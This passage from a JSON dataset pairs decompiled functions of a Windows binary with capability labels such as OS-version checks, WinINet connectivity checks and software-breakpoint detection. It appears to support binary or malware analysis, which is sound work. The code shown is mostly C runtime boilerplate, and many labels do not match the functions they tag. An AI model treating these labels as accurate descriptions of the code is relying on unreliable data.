        "decompiled_code": "\nvoid __cdecl fcn.004034d8(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4380e0) {\n        return;\n    }\n    *0x8f9480 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x8f9484 = &arg_8h;\n    *0x8f93c0 = 0x10001;\n    *0x8f9368 = 0xc0000409;\n    *0x8f936c = 1;\n    var_328h = *0x4380e0;\n    var_324h = *0x4380e4;\n    *0x8f9374 = unaff_retaddr;\n    *0x8f944c = in_GS;\n    *0x8f9450 = in_FS;\n    *0x8f9454 = in_ES;\n    *0x8f9458 = in_DS;\n    *0x8f945c = unaff_EDI;\n    *0x8f9460 = unaff_ESI;\n    *0x8f9464 = unaff_EBX;\n    *0x8f9468 = in_EDX;\n    *0x8f946c = in_ECX;\n    *0x8f9470 = in_EAX;\n    *0x8f9474 = unaff_EBP;\n    *0x8f9478 = unaff_retaddr;\n    *0x8f947c = in_CS;\n    *0x8f9488 = in_SS;\n    *0x8f93b8 = (*_sym.imp.KERNEL32.DLL_IsDebuggerPresent)();\n    fcn.00404ee9(1);\n    (*_sym.imp.KERNEL32.DLL_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.DLL_UnhandledExceptionFilter)(0x43049c);\n    if (*0x8f93b8 == 0) {\n        fcn.00404ee9(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.DLL_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.DLL_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 859
    },
    "0040367d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040367d(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00404e5b(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004042c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004042c6(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x404371;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0040439d;\n        uStack36 = *0x4380e0 ^ &fcn.004042c6::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004042c6::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00405298();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.004042c6::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 722
    },
    "0040692e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nfloat10 fcn.0040692e(ulong param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_14h;\n    uint32_t in_XMM0_Da;\n    uint uVar4;\n    uint32_t in_XMM0_Db;\n    uint uVar5;\n    uint32_t in_XMM0_Dd;\n    double dVar6;\n    double dVar7;\n    double dVar8;\n    uint64_t in_XMM2_Qa;\n    uint32_t uVar9;\n    double dVar10;\n    double dVar11;\n    uchar auVar12 [16];\n    double dVar13;\n    uint64_t in_XMM7_Qa;\n    double dVar14;\n    uint64_t uVar15;\n    double dVar17;\n    uint64_t uVar18;\n    double dStack12;\n    uint32_t uVar16;\n    \n    dVar8 = CONCAT44(in_XMM0_Db, in_XMM0_Da);\n    auVar12 = pinsrw(ZEXT816(0), 0x2000, 2);\n    uVar1 = in_XMM0_Db >> 0xc & 0x7ffff;\n    if (uVar1 - 0x3fb00 < 0x3bb) {\n        iVar2 = (in_XMM0_Db >> 0xc & 0xfffc) - 0xfb00;\n        auVar12 = CONCAT88(in_XMM2_Qa & in_XMM7_Qa, *0x431d68 & dVar8) | auVar12;\n        iVar3 = iVar2 * 4;\n        dVar11 = SUB168(auVar12, 0);\n        dVar13 = dVar8 * *(iVar2 * 2 + 0x4314a0);\n        dVar10 = SQRT(*0x431d70 - dVar8 * dVar8) * dVar11;\n        dVar6 = dVar13 - dVar10;\n        uVar1 = SUB164(auVar12 >> 0x20, 0);\n        uVar9 = uVar1 & 0x80000000;\n        dVar7 = dVar6 * dVar6;\n        return (((*0x431d18 * dVar7 + *0x431d10) * dVar6 * dVar7 * dVar7 +\n                (str.UUUUUU333333._0_8_ * dVar6 * dVar7 - ((*(iVar3 + 0x4305a0) ^ uVar9 << 0x20) - *0x431ca0))) -\n               ((dVar8 + dVar11) * (CONCAT44(in_XMM0_Db, in_XMM0_Da) - dVar11)) / (dVar13 + dVar10)) -\n               ((*(iVar3 + 0x4305a8) ^ SUB168(CONCAT412(uVar1, ZEXT412(uVar9) << 0x20) >> 0x40, 0)) - *0x431ca8 &\n               0xffffffff00000000);\n    }\n    if (uVar1 - 0x3febb < 0x41) {\n        dVar13 = (in_XMM0_Db >> 6) << 0x26;\n        dVar11 = *0x431d70 - dVar13 * dVar13;\n        dVar6 = (CONCAT44(in_XMM0_Db, in_XMM0_Da) + dVar13) * (dVar8 - dVar13);\n        dVar10 = SQRT(dVar11 - dVar6);\n        uVar1 = -(SUB121(CONCAT48(in_XMM0_Dd >> 0xc, CONCAT44(in_XMM0_Db, in_XMM0_Da)) >> 0x3f, 0) & 1);\n        dVar7 = *0x431d68 & dVar10 | SUB168(auVar12, 0) | ~*0x431d60 & CONCAT44(in_XMM0_Db, in_XMM0_Da);\n        iVar3 = ((dVar10 << 2) >> 0x30) - 0xfec0;\n        dVar10 = dVar10 * *(iVar3 * 8 + 0x4314a0);\n        dVar13 = (dVar13 * dVar7 - dVar10) + (dVar8 - dVar13) * dVar7;\n        dVar8 = ((dVar11 - dVar7 * dVar7) - dVar6) / (dVar10 + dVar10 + dVar13);\n        iVar3 = iVar3 * 0x10;\n        dVar7 = (SUB168(CONCAT412(uVar1, CONCAT48(uVar1, CONCAT44(uVar1, uVar1))) >> 0x40, 0) & *0x431cb8) +\n                *(iVar3 + 0x4305a8);\n        dVar11 = dVar13 * dVar13;\n        auVar12 = pinsrw(0x0, uVar1 & 0x8000, 3);\n        dVar6 = dVar8 + dVar7;\n        return (*0x431d18 * dVar11 + *0x431d10) * dVar13 * dVar11 * dVar11 +\n               str.UUUUUU333333._0_8_ * dVar13 * dVar11 + (CONCAT44(uVar1, uVar1) & *0x431cb0) + *(iVar3 + 0x4305a0) +\n               dVar8 + (dVar7 - dVar6) + dVar6 ^ SUB168(auVar12, 0);\n    }\n    if (uVar1 - 0x3c300 < 0x3800) {\n        dVar6 = CONCAT44(in_XMM0_Db, in_XMM0_Da) * CONCAT44(in_XMM0_Db, in_XMM0_Da);\n        dVar7 = CONCAT44(in_XMM0_Db, in_XMM0_Da) * CONCAT44(in_XMM0_Db, in_XMM0_Da);\n        dVar11 = dVar8 * dVar6;\n        return (*0x431ca8 - dVar8) +\n               (((*0x431ca0 - dVar11 * dVar11 * dVar11 * (*0x431d20 * dVar6 + *0x431d30 + *0x431d40 * dVar6 * dVar6)) -\n                CONCAT44(in_XMM0_Db, in_XMM0_Da) * dVar7 * (*0x431d28 * dVar7 + *0x431d38 + *0x431d48 * dVar7 * dVar7))\n               - (dVar8 - (*0x431ca8 - (*0x431ca8 - dVar8))));\n    }\n    if (uVar1 - 0x3fefc < 4) {\n        dVar8 = *0x431d78 - (dVar8 & *0x431d60) * *0x431d78;\n        uVar16 = dVar8 >> 0x20;\n        uVar15 = dVar8 & 0xffffffff;\n        dVar14 = uVar15 | uVar16 << 0x20;\n        dVar6 = SQRT(dVar8);\n        dVar17 = SUB168(CONCAT412(uVar16, CONCAT48(SUB84(dVar8, 0), dVar14)) >> 0x40, 0);\n        dVar13 = uVar15 | uVar16 << 0x20;\n        uVar18 = -(CONCAT44(in_XMM0_Db, in_XMM0_Da) < 0.0);\n        uVar1 = SUB164(ZEXT1216(CONCAT48(in_XMM0_Dd >> 0xc, uVar18)) >> 0x20, 0);\n        dVar8 = *0x431ce0 & dVar6;\n        uVar9 = dVar6 >> 0x20;\n        dVar7 = dVar6 & 0xffffffff | uVar9 << 0x20;\n        dVar11 = SUB168(CONCAT412(uVar9, CONCAT48(SUB84(dVar6, 0), dVar7)) >> 0x40, 0);\n        dVar10 = SUB168(CONCAT412(uVar9, CONCAT48(SUB84(dVar6, 0), dVar11)) >> 0x40, 0);\n        auVar12 = pinsrw(ZEXT816(0), in_XMM0_Db >> 0x10 & 0x8000, 3);\n        return (uVar1 << 0x20 & *0x431cb8) +\n               (*0x431d30 + *0x431d20 * dVar14 + *0x431d40 * dVar14 * dVar14) * dVar14 * dVar14 * dVar13 * dVar13 *\n               (dVar11 + dVar11) + ((uVar18 & 0xffffffff | uVar1 << 0x20) & *0x431cb0) +\n               (*0x431d38 + *0x431d28 * dVar17 + *0x431d48 * dVar17 * dVar17) *\n               SUB168(CONCAT412(uVar16, CONCAT48(uVar15, dVar13)) >> 0x40, 0) * (dVar10 + dVar10) +\n               ((dVar13 - dVar8 * dVar8) - (dVar6 - dVar8) * ((dVar7 + dVar7) - (dVar6 - dVar8))) / dVar11 +\n               dVar11 + dVar11 ^ SUB168(auVar12, 0);\n    }\n    if (uVar1 < 0x3ff00) {\n        return *0x431ca8 + *0x431ca0;\n    }\n    if ((0x3ff00000 - (in_XMM0_Db & 0x7fffffff) | in_XMM0_Da) != 0) {\n        if (((param_1 >> 0x20 & 0x7fffffff) + 0x80100000) - (param_1 == 0) < 0) {\n            auVar12 = pinsrw(ZEXT816(0), 0x7ff0, 3);\n            dVar8 = SUB168(auVar12, 0) * 0.0;\n            uVar4 = SUB84(dVar8, 0);\n            uVar5 = dVar8 >> 0x20;\n            arg_14h = 0x3a;\n        }\n        else {\n            dVar8 = CONCAT44(in_XMM0_Db, in_XMM0_Da) + 0.0;\n            uVar4 = SUB84(dVar8, 0);\n            uVar5 = dVar8 >> 0x20;\n            arg_14h = 0x3f0;\n        }\n        dStack12 = CONCAT44(uVar5, uVar4);\n        fcn.0040fdf6(&param_1, &param_1, &dStack12, arg_14h);\n        return dStack12;\n    }\n    iVar3 = -((in_XMM0_Db >> 0x10) >> 0xf);\n    uVar15 = CONCAT44(iVar3, iVar3);\n    return (*0x431cc8 & uVar15) + (*0x431cc0 & uVar15);\n}\n",
        "token_count": 2549
    },
    "00407e55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00407f48: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00407f4d)\n// WARNING: Removing unreachable block (ram,0x00407f7b)\n// WARNING: Removing unreachable block (ram,0x00407f53)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407e55(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406580(0x4352e0, 0x18);\n    fcn.0040a2aa(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x8f96ec != 1) {\n        *0x8f96e8 = 1;\n        *0x8f96e4 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040500f(*0x6275708);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040500f(*0x6275704);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00405006();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040500f(*piVar2);\n                        iVar3 = fcn.00405006();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040500f(*0x6275708);\n                        piVar1 = fcn.0040500f(*0x6275704);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00407d17(0x430384);\n        }\n        fcn.00407d17(0x43038c);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040a1b8(8);\n    }\n    return;\n}\n",
        "token_count": 805
    },
    "00408ea1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00408ea1(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405298();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00405298();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00409552": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409552(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00404504(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00405298();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00405298();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.004044dd(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00408f01(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0041668f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041668f(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040a1b8(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "004220c9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004220c9(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x004225ca;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x4390f8 - 1;\n        iVar4 = *0x4390f8 + (*0x4390f8 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x4390f8 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x004221fe;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00422205;\ncode_r0x004221fe:\n                        do {\n                            var_4h = 1;\ncode_r0x00422205:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00422213;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x00422213:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4390f4 - *0x4390f8) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4390f4 < iVar12) {\n                if (iVar12 < *0x4390f0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x439104;\n                    iVar4 = *0x4390fc + (*0x4390fc >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4390fc & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x4390fc + (*0x4390fc >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4390fc & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x439104 + *0x4390f0;\n                    uVar5 = 1;\n                }\n                goto code_r0x004225ca;\n            }\n            var_10h = *0x4390f4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x4390f8 - 1;\n            iVar12 = *0x4390f8 + (*0x4390f8 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x4390f8 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x004223b6;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x004223b6:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x4390fc + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x004225ca:\n    var_20h = iVar12 << (0x1fU - *0x4390fc & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x439100 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x439100 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3639
    },
    "0042260d": {
